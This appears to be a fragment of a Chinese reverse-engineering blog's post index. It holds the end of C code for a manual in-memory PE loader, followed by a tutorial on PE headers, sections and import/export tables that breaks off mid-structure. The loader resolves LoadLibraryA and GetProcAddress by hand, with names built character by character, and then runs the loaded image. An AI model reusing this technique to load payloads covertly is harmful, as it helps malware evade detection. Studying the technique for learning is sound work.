(PIMAGE_NT_HEADERS)((BYTE*)hKernel32 + ((PIMAGE_DOS_HEADER)hKernel32)-&gt;e_lfanew); // 获取导出表的地址 PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hKernel32 + pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); // 获取导出表的各个信息 DWORD* pFunctionNames = (DWORD*)((BYTE*)hKernel32 + pExportDirectory-&gt;AddressOfNames); DWORD* pFunctionAddresses = (DWORD*)((BYTE*)hKernel32 + pExportDirectory-&gt;AddressOfFunctions); WORD* pFunctionOrdinals = (WORD*)((BYTE*)hKernel32 + pExportDirectory-&gt;AddressOfNameOrdinals); // 遍历导出表，查找 LoadLibraryA char targetName1[50] = &quot;LoadLibraryA&quot;; targetName1[0] = &#x27;L&#x27;; targetName1[1] = &#x27;o&#x27;; targetName1[2] = &#x27;a&#x27;; targetName1[3] = &#x27;d&#x27;; targetName1[4] = &#x27;L&#x27;; targetName1[5] = &#x27;i&#x27;; targetName1[6] = &#x27;b&#x27;; targetName1[7] = &#x27;r&#x27;; targetName1[8] = &#x27;a&#x27;; targetName1[9] = &#x27;r&#x27;; targetName1[10] = &#x27;y&#x27;; targetName1[11] = &#x27;A&#x27;; targetName1[12] = &#x27;\\0&#x27;; // 遍历导出表，查找 GetProcAddress char targetName2[50] = &#123; 0 &#125;; targetName2[0] = &#x27;G&#x27;; targetName2[1] = &#x27;e&#x27;; targetName2[2] = &#x27;t&#x27;; targetName2[3] = &#x27;P&#x27;; targetName2[4] = &#x27;r&#x27;; targetName2[5] = &#x27;o&#x27;; targetName2[6] = &#x27;c&#x27;; targetName2[7] = &#x27;A&#x27;; targetName2[8] = &#x27;d&#x27;; targetName2[9] = &#x27;d&#x27;; targetName2[10] = &#x27;r&#x27;; targetName2[11] = &#x27;e&#x27;; targetName2[12] = &#x27;s&#x27;; targetName2[13] = &#x27;s&#x27;; targetName2[14] = &#x27;\\0&#x27;; int isP = 0; for (DWORD i = 0; i &lt; pExportDirectory-&gt;NumberOfNames; i++) &#123; char* functionName = (char*)((BYTE*)hKernel32 + pFunctionNames[i]); if (CompareStrings(functionName, targetName1)) &#123; // 找到函数名，获取其地址 DWORD functionRVA = pFunctionAddresses[pFunctionOrdinals[i]]; pLoadLibraryA = (LOADLIBRARYA)((BYTE*)hKernel32 + functionRVA); isP++; &#125; if (CompareStrings(functionName, targetName2)) &#123; // 找到函数名，获取其地址 DWORD functionRVA = pFunctionAddresses[pFunctionOrdinals[i]]; pGetProcAddress = (GETPROCADDR)((BYTE*)hKernel32 + functionRVA); isP++; &#125; if (isP == 2) &#123; break; &#125; &#125; break; // 找到后退出 &#125; &#125; pCurrentEntry = pCurrentEntry-&gt;Flink; &#125; if (!pLoadLibraryA &amp;&amp; !pGetProcAddress) &#123; char foece[] = &quot;无法获取 LoadLibraryA 地址，请检查目标进程模块&quot;; return FALSE; &#125; else &#123; char sucsess[] = &quot;sucsess&quot;; &#125; PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)(pNTheader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + pAlloc); //这个是IID的指针 if (pImport != NULL) &#123; while (pImport-&gt;Name != NULL) &#123; char DLLname[50] = &#123; 0 &#125;; // 定义一个存储 DLL 名称的缓冲区 char* pDLLName = (char*)(pImport-&gt;Name + pAlloc); // 获取 DLL 名称的地址 // 手动将名称拷贝到 DLLname 缓冲区 for (int i = 0; i &lt; sizeof(DLLname) - 1; i++) &#123; if (pDLLName[i] == &#x27;\\0&#x27;) // 遇到字符串结束符时停止 break; DLLname[i] = pDLLName[i]; // 拷贝字符 &#125; DLLname[sizeof(DLLname) - 1] = &#x27;\\0&#x27;; // 确保缓冲区以 &#x27;\\0&#x27; 结尾 HMODULE hProcess = pLoadLibraryA(DLLname); //通过名称找句柄 if (!hProcess) &#123; return FALSE; &#125; PIMAGE_THUNK_DATA64 pINT = (PIMAGE_THUNK_DATA64)(pImport-&gt;OriginalFirstThunk + pAlloc); PIMAGE_THUNK_DATA64 pIAT = (PIMAGE_THUNK_DATA64)(pImport-&gt;FirstThunk + pAlloc); while ((ULONG_PTR)(pINT-&gt;u1.AddressOfData) != NULL) &#123; PIMAGE_IMPORT_BY_NAME pFucname = (PIMAGE_IMPORT_BY_NAME)(pINT-&gt;u1.AddressOfData + pAlloc); //找DLL中函数的名字 if (pINT-&gt;u1.AddressOfData &amp; IMAGE_ORDINAL_FLAG32)//判断如果是序号就是第一种处理方式 &#123; pIAT-&gt;u1.AddressOfData = (ULONG_PTR)(pGetProcAddress(hProcess, (LPCSTR)(pINT-&gt;u1.AddressOfData)));//通过序号来获取地址 &#125; else &#123; pIAT-&gt;u1.AddressOfData = (ULONG_PTR)(pGetProcAddress(hProcess, pFucname-&gt;Name)); //通过函数名来获取地址 &#125; pINT++; pIAT++; &#125; pImport++; &#125; &#125; //最后的操作就是修正程序的入口地址 PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)(pAlloc + pDOSheader-&gt;e_lfanew); FARPROC EOP = (FARPROC)((LPBYTE)pAlloc + pNT-&gt;OptionalHeader.AddressOfEntryPoint); EOP(); return TRUE;&#125;","updated":"2025-10-08T09:44:33.655Z","categories":[{"name":"逆向行驶","slug":"逆向行驶","permalink":"https://l1pmoluy.github.io/categories/%E9%80%86%E5%90%91%E8%A1%8C%E9%A9%B6/"}],"tags":[{"name":"项目","slug":"项目","permalink":"https://l1pmoluy.github.io/tags/%E9%A1%B9%E7%9B%AE/"}]},{"title":"PE文件格式","date":"2024-12-04T03:16:14.000Z","path":"2024/12/04/PE文件格式/","text":"内核前置——PE文件格式 stu_PE：[原创]【2020年5月1日更新】StudyPE (x86 &#x2F; x64) 1.11 版-安全工具-看雪-安全社区|安全招聘|kanxue.com 加密与解密 第十章 PE文件格式 - 0Xor’ CTF WriteUp PE的基本结构刚开始的我放到另一篇文章里了，那个观PE文件有感所以没什么好说的了 基地址ImageBase当PE文件传入到内存中，内存中的版本叫模块，映射文件的起始地址叫模块句柄，这个初始内存地址叫及地址 这里可以进阶的去理解GetModuleHandle函数了，调用该函数时，传参传入一个文件或者一个名字，函数会返回对应模块的句柄（也就是那个文件被映射的基地址），如果传入的时NULL参数的话，则返回调用的函数的可执行文件 虚拟地址VA每个PE文件被映射到内存中，都有自己的虚拟空间，这个空间里的地址是虚拟地址 相对虚拟地址RVA虚拟地址（VA）&#x3D;基地址+相对虚拟地址（RVA） 文件偏移地址PE文件在磁盘中的时候，数据相对于文件头地址的地址是文件偏移地址 文件头MS-DOS头部 00 00-00 B0每个PE文件都是以一个DOS程序开始的，有了它，DOS就可以识别它为有效的执行体，然后运行紧随的DOSstub。DOSstub也相当于一个.exe文件了，在不支持PE文件格式的操作系统中，它会简单的提示一个不可执行的错误提示，DOS一般由编译软件编译成 PE文件的第一个字节位于一个传统的MS-DOS头部，称为IMAGE_DOS_HEADER，其结构体中比较重要的字段分别是 e_magic和e_lfanew。e_magic字段的值一般需要被设置为5A4Dh，意味着这是一个可执行的文件。这个值有一个#define，名为IMAGE_DOS_SIGNTURE（0x5A4D），在ascii表示法里它的值为“MZ”，他在PE文件中起到定义宏的作用，而有这个宏定义，操作系统才会把这个文件认定为可执行的，而e_lfanew字段是真正的PE文件头的相对偏移，指出真正的PE头的文件偏移位置，占用4字节，位于从文件开始偏移3Ch字节处 第一个划红线的地方是e_magic，值为MZ，第二个是e_flanew，值经过大小端序之后是00 00 00 B0，所以B0处才是真正的文件偏移位置，并且还可以看到右边有一串字符串，!This program cannot be run in DOS mode.这个就是前面提到的不可执行错误 PE文件头（IMAGE_NT_HEADER） 00 B0-01 20紧跟着DOSstub的是PE文件头，其中包含很多PE转载器会用到的重要字段，当执行体在支持PE文件结构的操作系统中执行时，PE装载器将从IMAGE_DOS_HEADER结构的e_lfanew字段里找到PE_Header的起始偏移量，用其加上基址，得到PE文件头的指针 PNTHeader&#x3D;ImageBase+dosHeader-&gt;e_lfanew Signature字段在一个有效的PE文件里，Signature字段被设置为0x 00 00 45 50，ACSII码字符是”PE\\0\\0“，定义宏为#define IMAGE_NT_SIGNATURE “PE\\0\\0”是一个PE文件的开始，而e_flanew字段正是指向”PE\\0\\0” IMAGE_FILE_HEADER结构 IMAGE_FILE_HEADER（映射文件头）结构包含PE文件的一些基本信息，最重要的是，其中一个域指出了IMAGE_OPTIONAL_HEADER的大小，这里按照红色框框划分，依次介绍 Machine：可执行文件的目标CPU类型。PE文件可以在多种机器上使用，不同平台上指令的机器码不同 NumberOfSestions：区块数目，块表紧跟在IMAGE_NT_HEADER后面 TimeDateStamp：表示文件的创建时间。这个值是自1970年1月1日以来用格林威治时间计算的秒数，是一个比文件系统的日期&#x2F;时间更精确的文件创建时间指示器，将这个值翻译成易读的字符串需要_ctime函数。另一个对此字段有用的函数是gmtime PointerToSymbolTable：COFF符号表的偏移地址位置，如果没有就是0 NumberOfSymbols：如果有COFF符号表，这个代表符号表的数目 SizeOfOptionalHeader：紧跟IMAGE_FILE_HEADER，表示数据的大小。在PE文件中，这个数据结构叫做IMAGE_OPTIONAL_HEADER，其大小依赖于当前文件是32位还是64位文件。对32位文件这个域通常是00E0h；对64位PE32+文件，这个域是00F0h。不管怎样，这些事要求的最小值，较大的值也可能出现 Characteristics：文件属性，有选择地通过几个值的运算得到。这些标志的有效只是定义于winnt.h内的IMAGE_FILE_XXX值。普通EXE文件的这个字段的值一般是010h，DLL文件里这个字段一般是2102h IMAGE_OPTIONAL_HEADER结构-可选映像头IMAGE_FILE_HEADER与IMAGE_OPTIONAL_HEADER看起来组成了完整的“PE文件头结构”。IMAGE_OPTINAL_HEADER结构也分为32与32+，不过他们大差不差，如下表示 :::successtypedef struct _IMAGE_OPTIONAL_HEADER{ &#x2F;&#x2F; &#x2F;&#x2F; Standard fields. &#x2F;&#x2F;+18h WORD Magic; &#x2F;&#x2F; 标志字, ROM 映像（0107h）,普通可执行文件（010Bh）+1Ah BYTE MajorLinkerVersion; &#x2F;&#x2F; 链接程序的主版本号+1Bh BYTE MinorLinkerVersion; &#x2F;&#x2F; 链接程序的次版本号+1Ch DWORD SizeOfCode; &#x2F;&#x2F; 所有含代码的节的总大小+20h DWORD SizeOfInitializedData; &#x2F;&#x2F; 所有含已初始化数据的节的总大小+24h DWORD SizeOfUninitializedData; &#x2F;&#x2F; 所有含未初始化数据的节的大小+28h DWORD AddressOfEntryPoint; &#x2F;&#x2F; 程序执行入口RVA+2Ch DWORD BaseOfCode; &#x2F;&#x2F; 代码的区块的起始RVA+30h DWORD BaseOfData; &#x2F;&#x2F; 数据的区块的起始RVA &#x2F;&#x2F; &#x2F;&#x2F; NT additional fields. 以下是属于NT结构增加的领域。 &#x2F;&#x2F;+34h DWORD ImageBase; &#x2F;&#x2F; 程序的首选装载地址+38h DWORD SectionAlignment; &#x2F;&#x2F; 内存中的区块的对齐大小+3Ch DWORD FileAlignment; &#x2F;&#x2F; 文件中的区块的对齐大小+40h WORD MajorOperatingSystemVersion; &#x2F;&#x2F; 要求操作系统最低版本号的主版本号+42h WORD MinorOperatingSystemVersion; &#x2F;&#x2F; 要求操作系统最低版本号的副版本号+44h WORD MajorImageVersion; &#x2F;&#x2F; 可运行于操作系统的主版本号+46h WORD MinorImageVersion; &#x2F;&#x2F; 可运行于操作系统的次版本号+48h WORD MajorSubsystemVersion; &#x2F;&#x2F; 要求最低子系统版本的主版本号+4Ah WORD MinorSubsystemVersion; &#x2F;&#x2F; 要求最低子系统版本的次版本号+4Ch DWORD Win32VersionValue; &#x2F;&#x2F; 莫须有字段，不被病毒利用的话一般为0+50h DWORD SizeOfImage; &#x2F;&#x2F; 映像装入内存后的总尺寸+54h DWORD SizeOfHeaders; &#x2F;&#x2F; 所有头 + 区块表的尺寸大小+58h DWORD CheckSum; &#x2F;&#x2F; 映像的校检和+5Ch WORD Subsystem; &#x2F;&#x2F; 可执行文件期望的子系统+5Eh WORD DllCharacteristics; &#x2F;&#x2F; DllMain()函数何时被调用，默认为 0+60h DWORD SizeOfStackReserve; &#x2F;&#x2F; 初始化时的栈大小+64h DWORD SizeOfStackCommit; &#x2F;&#x2F; 初始化时实际提交的栈大小+68h DWORD SizeOfHeapReserve; &#x2F;&#x2F; 初始化时保留的堆大小+6Ch DWORD SizeOfHeapCommit; &#x2F;&#x2F; 初始化时实际提交的堆大小+70h DWORD LoaderFlags; &#x2F;&#x2F; 与调试有关，默认为 0+74h DWORD NumberOfRvaAndSizes; &#x2F;&#x2F; 下边数据目录的项数，这个字段自Windows NT 发布以来一直是16+78h IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];&#x2F;&#x2F; 数据目录表} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; ::: #define IMAGE_NT_OPTIONAL_HDR32_MAGIC 0x10b &#x2F;&#x2F; 32位PE可选头#defineIMAGE_NT_OPTIONAL_HDR64_MAGIC 0x20b &#x2F;&#x2F; 64位PE可选头#defineIMAGE_ROM_OPTIONAL_HDR_MAGIC 0x107Magic：标识可选头位数。AddressOfEntryPoint：持有EP的RVA（地址），指出程序最先执行的代码起始地址。ImageBase：优先装填区域，有点像段地址的感觉。SectionAlignment、FileAlignment：File——节区在文件中的最小单位，Section——节区在内存中的最小单位。SizeOfimage：指定了PE Image在虚拟内存中所占空间大小。SizeOfHeaders：指出整个PE头的大小。Subststem：区分文件类型（如：sys，exe，dll）。NumberOfRvaAndSizes：指定DataDirectory数组的个数。DataDirectory：由IMAGE_DATA_DIRECTORY结构体组成的数组，指向输出表，输入表等等数据（这里在所有的红圈圈之后） 1234567891011121314151617181920typedefstruct_IMAGE_DATA_DIRECTORY&#123;DWORDVirtualAddress;//数据起始的RVADWORDSize;//数据块的长度&#125;IMAGE_DATA_DIRECTORY,*PIMAGE_DATA_DIRECTORY;VirtualAddress#defineIMAGE_DIRECTORY_ENTRY_EXPORT 0 //0 导出表#defineIMAGE_DIRECTORY_ENTRY_IMPORT 1 //1 导入表 #defineIMAGE_DIRECTORY_ENTRY_RESOURCE 2 //2 资源目录#defineIMAGE_DIRECTORY_ENTRY_EXCEPTION 3 //3 异常目录#defineIMAGE_DIRECTORY_ENTRY_SECURITY 4 //4 安全目录#defineIMAGE_DIRECTORY_ENTRY_BASERELOC 5 /5 重定位基本表#defineIMAGE_DIRECTORY_ENTRY_DEBUG 6 // Debug Directory // IMAGE_DIRECTORY_ENTRY_COPYRIGHT 7 // (X86 usage) #defineIMAGE_DIRECTORY_ENTRY_ARCHITECTURE 7 // Architecture Specific Data #defineIMAGE_DIRECTORY_ENTRY_GLOBALPTR 8 // RVA of GP #defineIMAGE_DIRECTORY_ENTRY_TLS 9 // TLS Directory #defineIMAGE_DIRECTORY_ENTRY_LOAD_CONFIG 10 // Load Configuration Directory #defineIMAGE_DIRECTORY_ENTRY_BOUND_IMPORT 11 // Bound Import Directory in headers #defineIMAGE_DIRECTORY_ENTRY_IAT 12 // Import Address Table #defineIMAGE_DIRECTORY_ENTRY_DELAY_IMPORT 13 // Delay Load Import Descriptors #defineIMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14 // COM Runtime descriptor 区块区块表在pe文件头后面便是区块表，是一个IMAGE_SECTION_HEADER结构数组。每个结构都包含了他所关联的区块信息，该数组个数由IMAGE_SECTION_HEADER.FileHeader.NumberOfSections提出（[想起来了，都想起来了].jpg） :::successtypedef struct _IMAGE_SECTION_HEADER { BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; // 节表名称,如“.text” //IMAGE_SIZEOF_SHORT_NAME=8 union{ DWORD PhysicalAddress; // 在文件中的物理地址 DWORD VirtualSize; &#x2F;&#x2F; 真实长度，这两个值是一个联合结构，可以使用其中的任何一个，一般是取后一个 } Misc; DWORD VirtualAddress; &#x2F;&#x2F; 节区的 RVA 地址 DWORD SizeOfRawData; &#x2F;&#x2F; 在文件中对齐后的尺寸 DWORD PointerToRawData; &#x2F;&#x2F; 在文件中的偏移量 DWORD PointerToRelocations; &#x2F;&#x2F; 在OBJ文件中使用，重定位的偏移 DWORD PointerToLinenumbers; &#x2F;&#x2F; 行号表的偏移（供调试使用地） WORD NumberOfRelocations; &#x2F;&#x2F; 在OBJ文件中使用，重定位项数目 WORD NumberOfLinenumbers; &#x2F;&#x2F; 行号表中行号的数目 DWORD Characteristics; &#x2F;&#x2F; 节属性如可读，可写，可执行等 } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; ::: (1)Name：区块名。这是一个由8个ASCII码组成，用来定义区块的名称的数组。多数区块名都习惯性以一个“.”作为开头（例如：.text），这个“.”实际上是不是必须的。值得我们注意的是，如果区块名达到8 个字节，后面就没有0字符了。前边带有一个$ 的区块名字会从连接器那里得到特殊的待遇，前边带有$ 的相同名字的区块在载入时候将会被合并，在合并之后的区块中，他们是按照“$”后边的字符的字母顺序进行合并的。每个区块的名称都是唯一的，不能有同名的两个区块。但事实上节的名称不代表任何含义，他的存在仅仅是为了正规统一编程的时候方便程序员查看方便而设置的一个标记而已。所以将包含代码的区块命名为“.Data”或者说将包含数据的区块命名为“.Code”都是合法的。当我们要从PE 文件中读取需要的区块时候，不能以区块的名称作为定位的标准和依据，正确的方法是按照IMAGE_OPTIONAL_HEADER32 结构中的数据目录字段结合进行定位。 (2) VirtualSize：对表对应的区块的大小，这是区块的数据在没有进行对齐处理前的实际大小。如果VirtualSize &gt; SizeOfRawData,那么SizeOfRawData是可执行文件初始化数据的大小(SizeOfRawData – VirtualSize)的字节用0来填充。这个字段在OBJ文件中被设为0。 (3)VirtualAddress：该块时装载到内存中的RVA，注意这个地址是按内存页对齐的，她总是SectionAlignment的整数倍，在工具中第一个块默认RVA为1000，在OBJ中为0。 (4)SizeofRawData：该块在磁盘中所占的大小,在可执行文件中，该字段包括经过FileAlignment调整后块的长度。例如FileAlignment的大小为200h，如果VirtualSize中的块长度为19Ah个字节，这一块保存的长度为200h个字节。 (5) PointerToRawData：该块是在磁盘文件中的偏移，程序编译或汇编后生成原始数据，这个字段用于给出原始数据块在文件的偏移，如果程序自装载PE或COFF文件（而不是由OS装载），这种情况，必须完全使用线性映像方法装入文件，需要在该块处找到块的数据。 上述四个数据很重要，在分析的时候经常用到，因此需要熟悉其代表的具体意义。 PointerToRawDate+SizeofRawData&#x3D;下一块偏移地址 (6) PointerToRelocations 在PE中无意义 (7) PointerToLinenumbers 行号表在文件中的偏移值，文件调试的信息 (8) NumberOfRelocations 在PE中无意义 (9) NumberOfLinenumbers 该块在行号表中的行号数目 (10) Characteristics 块属性,(如代码&#x2F;数据&#x2F;可读&#x2F;可写)的标志，这个值可通过链接器的&#x2F;SECTION选项设置.下面是比较重要的标志： 常见区块与区块合并区块在映像中是按照RVA划分的，常见区块如下 链接器的一个有趣特征就是能够合并区块。如果两个区块有相似、一致性的属性，那么它们在链接的时候能被合并成一个单一的区块。这取决于是否开启编译器的 &#x2F;merge 开关。事实上合并区块有一个好处就是可以节省磁盘的内存空间……注意：我们不应该将.rsrc、.reloc、.pdata 合并到··的区块里。 区块的对齐值区块的大小是需要对齐的，有两种对齐值，一种用于磁盘文件，一种用于内存中，PE文件头中FileAlignment与SectionAlignment分别声明了磁盘区块与内存区块的对齐值 如果区块没这么多，就用0填充 文件偏移与虚拟地址的转换RVA 和文件偏移的转换 RVA 是相对虚拟地址（RelativeVirtual Address）的缩写，顾名思义，它是一个“相对地址”是相对于基地址的相对地址 举个例子，如果 Windows 装载器将一个PE 文件装入到 00400000h 处的内存中，而某个区块中的某个数据被装入 0040··xh 处，那么这个数据的 RVA 就是（0040··xh - 00400000h ）&#x3D; ··xh，反过来说，将 RVA 的值加上文件被装载的基地址，就可以找到数据在内存中的实际地址。 换算 RVA 和文件偏移因为对齐值的不同，所以文件映射在内存中相对偏移地址会不同，也就出现了文件偏移地址-相对虚拟地址的转换 从图中可以看到 File Offset&#x3D;RVA+k File Offset=VA-k-ImageBase 后面不同块的转换计算又要涉及到，区块间隙的不同，可以按照表自己去算，也可以用工具 输入表小tips，这里之前可以先看看c语言补习班中的联合体概念 一个程序，使用来自其他DLL的代码或数据的动作称为输入。当PE文件被载入时，Windows加载器的工作之一就是定位所有被输入的函数和数据 输入函数的调用输入函数就是这个程序要调用的函数，但是这个函数不在程序所在文件中，他可能在别的DLL文件中，在运行之前，PE加载器是不知道使用的函数在其文件中的地址等信息，直到使用了这个函数才会有信息 当应用程序调用一个DLL文件的代码或者数据的时候，它正在被隐式的地链接到DLL，这个过程由Windows加载器自动完成，在运行到相关API时，这意味着其所在的DLL文件已经被加载 这些过程几乎都是由Loadlibrary与GetProcAddress函数完成的，并且当他们在隐式链接的时候，这些工作都是由Windows加载器完成的，如果调用的DLL文件里的函数里还有别的DLL文件里的函数，也将由Windows加载器来完成相关加载调用 在PE文件里有一组数据结构，它们分别对应于被输入的DLL。每一个这样的结构都给出了被输入的DLL的名称并指向一组函数指针，这组函数指针被称为输入地址表（IAT），每一个被引入的API在IAT里都有保留位置，在那里它将被Windows加载器写入输入函数的地址 一旦模块被载入，IAT中将包含所要调用输入函数的地址 如果要调用一个输入函数，那么就会有如下两种方式调用 我们先假设402010h处有我们需要调用的函数地址，且402010h位于IAT中 一.低效调用:::successCall 00401164 …… :00401164 Jmp dword ptr [00402010] ::: 可以看到是先跳转到一个jmp指令在实现跳转，这是因为**CALL**指令中后面紧跟着的其实是实际地址，而并不是函数指针（dword ptr [00402010]），所以需要配合jmp指令 二.优化那么想要让call指令后变成函数指针类型，就需要一个给编译器的提示形式，指令变成 :::successCALL DWORD PTR [XXXXXXXX] ::: 可以发现变成跳转函数指针了，但是这样的跳转就需要目标函数定义的时候加上前缀_declspec，示例如下： :::success_declsped(dllimport) void Foo(void); ::: 输入表的结构在PE文件头的可选映像头IMAGE_OPTIONAL_HEADER，数据目录表的第2个成员指向输入表。输入表以一个IMAGE_IMPORT_DESCRIPTOR（IID）数组开始。每个被PE文件隐式链接的DLL都有一个IID。 在这个结构中并没有指出该结构数组的项数，但是他最后一个单元是NULL，例如，某个PE文件从两个DLL文件中引入函数，因此存在两个IID结构来描述这些DLL，并在两个IID结构的最后一个内容全为0的IID结构作为结束。IID的结构如下 :::successtypedef struct _IMAGE_IMPORT_DESCRIPTOR { union &#123; DWORD Characteristics; DWORD OriginalFirstThunk; //导入名称表(INT)的地址RVA &#125; DUMMYUNIONNAME; DWORD TimeDateStamp; //时间戳多数情况可忽略.如果是0xFFFFFFFF为绑定导入 DWORD ForwarderChain; //链表的前一个结构 DWORD Name; //导入DLL文件名的地址RVA DWORD FirstThunk; //导入地址表(IAT)的地址RVA } IMAGE_IMPORT_DESCRIPTOR; typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR; ::: **OriginalFirstThunk**：包含指向**导入名称表(INT)**的RVA。INT是一个**IMAGE_THUNK_DATA**结构的数组，数组中的每个**IMAGE_THUNK_DATA**结构都指向**IMAGE_IMPORT_BY_NAME**，数组以一个内容为0的IMAGE_THUNK_DATA结构结束 IMAGE_THUNK_DATA是双字的结构如下： :::success&#x2F;&#x2F;成员OriginalFirstThunk与FirstThunk都指向此结构: typedef struct _IMAGE_THUNK_DATA32 { union &#123; DWORD ForwarderString; // PBYTE DWORD Function; // PDWORD DWORD Ordinal; // 序号 DWORD AddressOfData; // PIMAGE_IMPORT_BY_NAME &#125; u1; } IMAGE_THUNK_DATA32; typedef IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32; ::: IMAGE_THUNK_DATA 是一个联合体，在任何时刻，它只会使用其中一个成员。而我们通常关心的是 AddressOfData，它存储指向 IMAGE_IMPORT_BY_NAME 结构的指针。 当IMAGE_THUNK_DATA值的最高位为1时，表示函数以序号方式输入，这时低31位或63位被看成一个函数序号 当IMAGE_THUNK_DATA值得最高位为0时，表示函数以字符串类型的函数名方式输入，这时双字的值是一个RVA。指向IMAGE_IMPORT_BY_NAME结构 IMAGE_IMPORT_BY_NAME仅有一字大小，结构如下： :::success&#x2F;&#x2F;如果结构IMAGE_THUNK_DATA32成员最高有效位(MSB)为1时低31位为导出序号.否则指向此结构. typedef struct _IMAGE_IMPORT_BY_NAME { WORD Hint; //导出序号(有些编译器不会填充此值) CHAR Name[1]; //该值长度不准确,以0结尾的字符串.导出函数名. } IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME; ::: **Hint**：本函数在其所驻留的DLL的输出表的序号。这个值不是必须的，一些链接器将它设为0。他的作用是让PE装载器快速从DLL的输出表中快速查询函数 Name：含有输入函数的函数名。函数名是一个ASCII字符串，以“NULL”结尾 :::color5举例：如果程序需要调用外部函数 MessageBoxA，OriginalFirstThunk 可能会包含如下信息： 它首先指向 IMAGE_THUNK_DATA 数组中的第一个元素，该元素指向 IMAGE_IMPORT_BY_NAME，而 IMAGE_IMPORT_BY_NAME 则存储 MessageBoxA 的名称。 该数组以一个 IMAGE_THUNK_DATA 结构结束，内容为 0，表示数组的终结 ::: 也就是本来这里存的是地址，而地址指向的是一个联合体，联合体中的第四个存储的是IMAGE_IMPORT_BY_NAME 的地址，最后IMAGE_IMPORT_BY_NAME 中有关于导入函数的信息 这里要是还不明白先看下面的图 TimeDateStamp：一个32位的时间标志，可以忽略 ForwarderChain：这是第一个被转向的API的索引，一般为0，在程序引用一个DLL中的API而这个API又在引用其他DLL的API时使用（很少出现） Name：DLL名字的指针。他是一个以”00”结尾的ASCII字符的RVA地址，该字符串包含输入的DLL名，例如“KERNEKL32.DLL””USER32.DLL” FirstThunk：包含指向输入地址表（IAT）的RVA，IAT也是IMAGE_THUNK_DATA结构的数组 是不是发现，欸？FirstThunk和OriginalFirstThunk感觉一样啊，因为他们本质上都是指向了IMAGE_THUNK_DATA结构，如图 他们的结束都是由一个值为0的IMAGE_THUNK_DATA元素表示的。 输入地址表那么为什么会有两个看上去一样的结构一样的表呢 第一个由OriginalFirstThunk指向的IMAGE_THUNK_DATA是不可改写的，单独的一项，而第二个由FirstThunk指向的IMAGE_THUNK_DATA是由PE装载器，通过第一个OriginalFirstThunk指向的IMAGE_THUNK_DATA找到的IMAGE_IMPORT_BY_NAME中的地址，写到第二个表中的，如下图好理解 输入表实例分析在这里进行这节的汇总，首先输入表在数据目录表的第2个成员指向输入表（**DataDirectory[16]**这个东东） 文件里看到是80h，再根据头文件起始是B0h，输入表地址就是在整个文件的130h处，看到是40 20 00 00，那么就是002040h，不过这里是RVA值，如果在磁盘文件中查看的话就得转换成文件偏移地址 通过stu_PE可以看到，2040h属于.rdata段，且.rdata段文件偏移对应的是600h，相对虚拟地址是2000h，所以k&#x3D;2000h-600h&#x3D;1A00h（注意这里是16进制算法），所以输入表**IMAGE_IMPORT_DESCRIPTOR(IID)**在2040h-1A00h&#x3D;640h处 如图便是IID处，IID包含五个双字，因为IID结束的标志是下一个IID都是0，起到NULL的效果，所以上图一共是有两个IID，每个IID的第四个字段是指向DLL名称的指针，那我们来看第一个，是00 00 21 74，根据上一张图我们知道，还是属于.rdata段，所以计算结果是2174h-1A00h&#x3D;774h 原来是USER.dll，再通过IID开始的数组元素一步步去找函数名，00 00 20 8C-&gt;06 8C，是00002110-&gt;710，所以INT是如下图 但是发现，如›\u0001LoadIconA函数，前面有两个不可见字符，这个便是作为函数名（Hint）引用的，可以为0 并且还可以观察到，IID里面的IAT与INT指向的地方刚开始是一样的。系统在程序初始化的时候会根据OrginalFirstThunk的值找到函数名，然后用GetProcAddress函数（后功能类似的系统代码）并根据函数名取得函数的入口地址，最后用函数入口地址取代FirstThunk指向的地址串中对应的值 这是开始前的图 接下来是一个从内存中抓取的实例（刚刚程序在内存中启动后保存成磁盘文件），所以他的结构就是映射到内存中的状态，由于内存中的对齐值与内存页相同，所以此时文件偏移地址与相对虚拟地址相等，先看原本的IID（2040），也就是不用转换的值 发现，OrginalFirstThunk没变，但是FirstThunk变了，跟着去看2010-&gt;会得到一个地址表（IAT）如下 这个地址装的就是函数地址了，最后上一个图 绑定输入这个的存在就是为了节省一个程序启动的准备时间，如果一个程序每开一次都要一个个去映射DLL文件然后找地址再赋值，是很麻烦的 那么就可以写好一个程序使用绑定程序将其绑定，此时IAT在磁盘中也存放的是与DLL输出函数相关的实际地址，如VS中的Bind.exe就是一个绑定程序 在进程执行中就需要两个假设 - 当程序初始化时，需要的DLL实际上加载到了他们的首选基地址中 - 自从绑定操作执行以来，DLL输出表中引用的符号位置一直没有改变 数据目录表的第12个成员指向绑定输入，绑定输入以一个IMAGE_BOUND_IMPORT_DESCRIPTOR结构的数组开始 :::success typedef struct _IMAGE_BOUND_IMPORT_DESCRIPTOR { DWORD TimeDateStamp; 被输入DLL的时间，以便加载器快速判断绑定是不是最新的 WORD OffsetModuleName; 指向被输入DLL的名称的偏移，与第一个IBID结构之间的偏移 WORD NumberOfModuleForwarderRefs; 其后ModuleForwarderRefs的数目 &#x2F;&#x2F; Array of zero or more IMAGE_BOUND_FORWARDER_REF follows } IMAGE_BOUND_IMPORT_DESCRIPTOR, *PIMAGE_BOUND_IMPORT_DESCRIPTOR; ::: 输出表输出表的结构输出表的主要内容是一个表格，其中包含函数名称、输出序数等 输出表是数据目录表的第一个成员，指向IMAGE_EXPORT_DIRECTORY（IED） :::success typedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD Name; &#x2F;&#x2F;DLL的名称 DWORD Base; 